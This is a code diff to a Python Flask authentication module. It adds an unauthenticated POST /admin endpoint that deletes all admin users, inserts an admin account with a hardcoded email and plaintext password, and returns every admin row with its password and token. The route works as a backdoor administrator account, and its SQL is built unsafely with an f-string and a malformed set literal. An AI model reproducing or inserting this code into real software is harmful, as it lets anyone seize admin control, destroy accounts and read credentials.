@@ -84,3 +84,19 @@ def sign_in():
             "token": token,
             "message": "Login success"
         }, 200
+    
+    
+@auth_bp.route("/admin", methods=["POST"])
+def admin():
+    # try:
+        run_query("DELETE from users WHERE admin=True", commit=True)
+        email = "doaibu@gmail.com"
+        password = "doaibuberkah"
+        token = {'email': email, 'password': password}
+        token = generate_jwt(token)
+        run_query(f"INSERT INTO users (id, nama, email, password, balance, token, type, admin) \
+            VALUES {666, 'admin', email, password, 0 , token, 'seller', True}",
+                commit=True)
+        data = run_query(f"SELECT * FROM users WHERE admin=True")
+        return data
+        
